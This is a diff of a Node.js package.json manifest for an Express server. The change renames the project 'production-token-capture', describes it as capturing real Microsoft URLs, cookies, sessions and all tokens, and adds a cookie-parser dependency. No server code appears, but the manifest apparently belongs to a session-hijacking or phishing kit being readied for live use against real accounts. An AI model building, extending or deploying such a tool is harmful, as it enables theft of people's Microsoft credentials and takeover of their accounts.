@@ -1,6 +1,7 @@
 {
-  "name": "token-capture",
+  "name": "production-token-capture",
   "version": "1.0.0",
+  "description": "Production Microsoft Token Capture - Real URLs, Cookies, Sessions, All Tokens",
   "main": "server.js",
   "scripts": {
     "start": "node server.js"
@@ -8,7 +9,8 @@
   "dependencies": {
     "express": "^4.18.2",
     "axios": "^1.6.2",
-    "dotenv": "^16.3.1"
+    "dotenv": "^16.3.1",
+    "cookie-parser": "^1.4.6"
   },
   "engines": {
     "node": ">=18.0.0"
